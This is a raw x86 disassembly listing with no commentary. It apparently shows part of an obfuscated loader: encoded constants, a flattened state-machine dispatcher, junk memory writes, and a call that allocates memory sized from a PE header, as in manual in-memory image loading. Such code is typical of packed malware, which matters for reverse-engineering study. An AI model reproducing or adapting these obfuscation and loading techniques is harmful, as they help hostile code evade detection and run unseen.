  42782b:	lea    eax,[eax+esi*1+0x3272f8]
  427832:	xor    eax,edi
  427834:	mov    ecx,DWORD PTR [ebp+0x8]
  427837:	mov    edx,DWORD PTR [ebp+0x18]
  42783a:	xor    ecx,edi
  42783c:	add    ecx,ebx
  42783e:	cmp    edx,ecx
  427840:	je     0x42763d
  427846:	mov    eax,DWORD PTR [ebp+0x8]
  427849:	mov    ecx,DWORD PTR [ebp+0x18]
  42784c:	xor    eax,edi
  42784e:	add    eax,ebx
  427850:	cmp    ecx,eax
  427852:	jne    0x427865
  427854:	mov    eax,DWORD PTR [ebp-0x8]
  427857:	mov    ecx,DWORD PTR [ebp+0x1c]
  42785a:	xor    eax,edi
  42785c:	lea    eax,[eax+ecx*1+0x3272f8]
  427863:	jmp    0x4278dc
  427865:	push   0x18
  427867:	push   DWORD PTR [ebp-0x4]
  42786a:	lea    eax,[ebp-0x64]
  42786d:	push   eax
  42786e:	call   0x426b51
  427873:	mov    eax,DWORD PTR [ebp+0x8]
  427876:	mov    ecx,DWORD PTR [ebp-0x18]
  427879:	xor    eax,edi
  42787b:	add    eax,ebx
  42787d:	cmp    eax,ecx
  42787f:	je     0x427894
  427881:	mov    eax,DWORD PTR [ebp+0x8]
  427884:	xor    eax,edi
  427886:	add    eax,ebx
  427888:	push   eax
  427889:	push   0x18
  42788b:	lea    eax,[ebp-0x64]
  42788e:	push   eax
  42788f:	call   0x427137
  427894:	mov    eax,DWORD PTR [ebp-0x4]
  427897:	add    eax,0x18
  42789a:	mov    DWORD PTR [ebp+0x18],eax
  42789d:	push   DWORD PTR [ebp-0x50]
  4278a0:	push   DWORD PTR [ebp+0x18]
  4278a3:	mov    eax,DWORD PTR [ebp-0x54]
  4278a6:	add    eax,DWORD PTR [ebp-0x20]
  4278a9:	push   eax
  4278aa:	call   0x426b51
  4278af:	mov    eax,DWORD PTR [ebp+0x8]
  4278b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4278b5:	xor    eax,edi
  4278b7:	add    eax,ebx
  4278b9:	cmp    eax,ecx
  4278bb:	je     0x4278ce
  4278bd:	push   0x0
  4278bf:	push   DWORD PTR [ebp-0x50]
  4278c2:	mov    eax,DWORD PTR [ebp-0x54]
  4278c5:	add    eax,DWORD PTR [ebp-0x20]
  4278c8:	push   eax
  4278c9:	call   0x427137
  4278ce:	mov    eax,DWORD PTR [ebp-0x24]
  4278d1:	mov    ecx,DWORD PTR [ebp-0x50]
  4278d4:	add    DWORD PTR [eax],ecx
  4278d6:	mov    eax,DWORD PTR [ebp-0x50]
  4278d9:	add    eax,DWORD PTR [ebp+0x1c]
  4278dc:	mov    DWORD PTR [ebp+0x1c],eax
  4278df:	mov    eax,DWORD PTR [ebp-0x8]
  4278e2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4278e5:	xor    eax,edi
  4278e7:	add    eax,ebx
  4278e9:	imul   eax,ecx
  4278ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4278ef:	mov    edx,DWORD PTR [ebp-0x28]
  4278f2:	xor    ecx,edi
  4278f4:	lea    ecx,[ecx+edx*1+0x3272f8]
  4278fb:	cmp    eax,ecx
  4278fd:	jb     0x42755b
  427903:	mov    esi,DWORD PTR [ebp+0x14]
  427906:	mov    eax,DWORD PTR [ebp-0x20]
  427909:	mov    DWORD PTR [esi],eax
  42790b:	jmp    0x427952
  42790d:	mov    ecx,DWORD PTR [ebp+0x8]
  427910:	mov    edx,DWORD PTR [ebp+0xc]
  427913:	xor    ecx,edi
  427915:	xor    edx,edi
  427917:	add    ecx,ebx
  427919:	add    edx,ebx
  42791b:	cmp    ecx,edx
  42791d:	jne    0x427931
  42791f:	mov    eax,ds:0x7f642dde
  427924:	imul   eax,eax,0x9f15fcef
  42792a:	mov    ds:0x7f642dde,eax
  42792f:	jmp    0x427952
  427931:	mov    ecx,DWORD PTR [ebp+0x8]
  427934:	xor    ecx,edi
  427936:	add    ecx,ebx
  427938:	cmp    eax,ecx
  42793a:	je     0x427948
  42793c:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  427946:	jmp    0x427952
  427948:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  427952:	pop    edi
  427953:	pop    esi
  427954:	pop    ebx
  427955:	leave  
  427956:	ret    0x18
  427959:	push   ebp
  42795a:	mov    ebp,esp
  42795c:	and    esp,0xfffffff8
  42795f:	mov    eax,DWORD PTR [ebp+0x20]
  427962:	sub    esp,0x14
  427965:	push   ebx
  427966:	mov    ebx,DWORD PTR [ebp+0x14]
  427969:	push   esi
  42796a:	push   edi
  42796b:	cmp    eax,0xf89c85b9
  427970:	jne    0x42797c
  427972:	push   0xf89c85b8
  427977:	jmp    0x427aae
  42797c:	mov    eax,DWORD PTR [ebp+0x20]
  42797f:	cmp    eax,0xf89c85b8
  427984:	jne    0x427990
  427986:	push   0xf89c85bb
  42798b:	jmp    0x427aae
  427990:	mov    eax,DWORD PTR [ebp+0x20]
  427993:	cmp    eax,0xf89c85bb
  427998:	jne    0x4279a4
  42799a:	push   0xf89c85ba
  42799f:	jmp    0x427aae
  4279a4:	mov    eax,DWORD PTR [ebp+0x20]
  4279a7:	cmp    eax,0xf89c85ba
  4279ac:	jne    0x4279b8
  4279ae:	push   0xf89c85bd
  4279b3:	jmp    0x427aae
  4279b8:	mov    ecx,DWORD PTR [ebp+0x20]
  4279bb:	mov    eax,0xf89c85be
  4279c0:	cmp    ecx,eax
  4279c2:	jne    0x427a7e
  4279c8:	mov    eax,DWORD PTR [ebp+0x10]
  4279cb:	mov    DWORD PTR [esp+0xc],eax
  4279cf:	mov    eax,DWORD PTR [ebp+0x18]
  4279d2:	mov    DWORD PTR [esp+0x14],eax
  4279d6:	mov    eax,DWORD PTR [ebp+0xc]
  4279d9:	mov    DWORD PTR [esp+0x18],eax
  4279dd:	mov    eax,DWORD PTR [ebp+0x8]
  4279e0:	mov    DWORD PTR [esp+0x10],eax
  4279e4:	mov    eax,DWORD PTR [esp+0x10]
  4279e8:	mov    ecx,DWORD PTR [esp+0x14]
  4279ec:	mov    edi,0x75108b1
  4279f1:	xor    eax,edi
  4279f3:	mov    esi,0x3272f8
  4279f8:	add    eax,esi
  4279fa:	mov    DWORD PTR [ecx],eax
  4279fc:	mov    eax,DWORD PTR [esp+0xc]
  427a00:	mov    eax,DWORD PTR [eax+0x194]
  427a06:	mov    ecx,DWORD PTR [eax]
  427a08:	mov    eax,DWORD PTR [esp+0xc]
  427a0c:	mov    eax,DWORD PTR [eax+0x194]
  427a12:	mov    eax,DWORD PTR [eax]
  427a14:	add    eax,DWORD PTR [ecx+0x3c]
  427a17:	mov    ecx,DWORD PTR [esp+0xc]
  427a1b:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427a21:	mov    ecx,DWORD PTR [ecx+0x14]
  427a24:	push   0x4
  427a26:	push   0x3000
  427a2b:	push   DWORD PTR [eax+0x50]
  427a2e:	push   0x0
  427a30:	call   ecx
  427a32:	mov    DWORD PTR [ebx],eax
  427a34:	mov    eax,DWORD PTR [esp+0x10]
  427a38:	push   DWORD PTR [esp+0xc]
  427a3c:	xor    eax,edi
  427a3e:	add    eax,esi
  427a40:	mov    DWORD PTR [esp+0x20],eax
  427a44:	lea    eax,[esp+0x20]
  427a48:	push   eax
  427a49:	push   ebx
  427a4a:	push   DWORD PTR [esp+0x20]
  427a4e:	push   DWORD PTR [esp+0x28]
  427a52:	push   DWORD PTR [esp+0x24]
  427a56:	call   0x42741b
  427a5b:	mov    eax,DWORD PTR [esp+0x10]
  427a5f:	mov    ecx,DWORD PTR [ebx]
  427a61:	xor    eax,edi
  427a63:	add    eax,esi
  427a65:	cmp    ecx,eax
  427a67:	je     0x427ac5
  427a69:	mov    eax,DWORD PTR [esp+0x18]
  427a6d:	mov    ecx,DWORD PTR [esp+0x14]
  427a71:	xor    eax,edi
  427a73:	add    eax,esi
  427a75:	imul   eax,DWORD PTR [esp+0x1c]
  427a7a:	mov    DWORD PTR [ecx],eax
  427a7c:	jmp    0x427ac5
  427a7e:	mov    ecx,DWORD PTR [ebp+0x20]
  427a81:	cmp    ecx,0xf89c85bd
  427a87:	jne    0x427a90
  427a89:	push   0xf89c85bc
  427a8e:	jmp    0x427aae
  427a90:	mov    ecx,DWORD PTR [ebp+0x20]
  427a93:	cmp    ecx,0xf89c85bc
  427a99:	jne    0x427aa2
  427a9b:	push   0xf89c85bf
  427aa0:	jmp    0x427aae
  427aa2:	mov    ecx,DWORD PTR [ebp+0x20]
  427aa5:	cmp    ecx,0xf89c85bf
  427aab:	jne    0x427ac5
  427aad:	push   eax
  427aae:	push   DWORD PTR [ebp+0x1c]
  427ab1:	push   DWORD PTR [ebp+0x18]
  427ab4:	push   ebx
  427ab5:	push   DWORD PTR [ebp+0x10]
  427ab8:	push   DWORD PTR [ebp+0xc]
  427abb:	push   DWORD PTR [ebp+0x8]
  427abe:	call   0x427959
  427ac3:	mov    DWORD PTR [ebx],eax
  427ac5:	mov    eax,DWORD PTR [ebx]
  427ac7:	pop    edi
  427ac8:	pop    esi
  427ac9:	pop    ebx
  427aca:	mov    esp,ebp
  427acc:	pop    ebp
  427acd:	ret    0x1c
  427ad0:	push   ebp
  427ad1:	mov    ebp,esp
  427ad3:	sub    esp,0xc
  427ad6:	mov    eax,0xf89c85b9
  427adb:	mov    DWORD PTR [ebp-0x8],eax
  427ade:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427ae5:	mov    ecx,DWORD PTR [ebp-0x8]
  427ae8:	xor    ecx,0x75108b1
  427aee:	add    ecx,0x3272f8
  427af4:	mov    DWORD PTR [ebp-0x4],ecx
  427af7:	mov    ecx,DWORD PTR [ebp+0xc]
  427afa:	push   eax
  427afb:	mov    DWORD PTR [ebp+0xc],ecx
  427afe:	push   DWORD PTR [ebp+0xc]
  427b01:	lea    eax,[ebp-0x4]
  427b04:	push   DWORD PTR [ebp+0x8]
  427b07:	push   eax
  427b08:	push   DWORD PTR [ebp+0xc]
  427b0b:	push   DWORD PTR [ebp-0xc]
  427b0e:	push   DWORD PTR [ebp-0x8]
  427b11:	call   0x427959
  427b16:	mov    DWORD PTR [ebp-0x4],eax
  427b19:	mov    eax,DWORD PTR [ebp-0x4]
  427b1c:	leave  
  427b1d:	ret    0x8
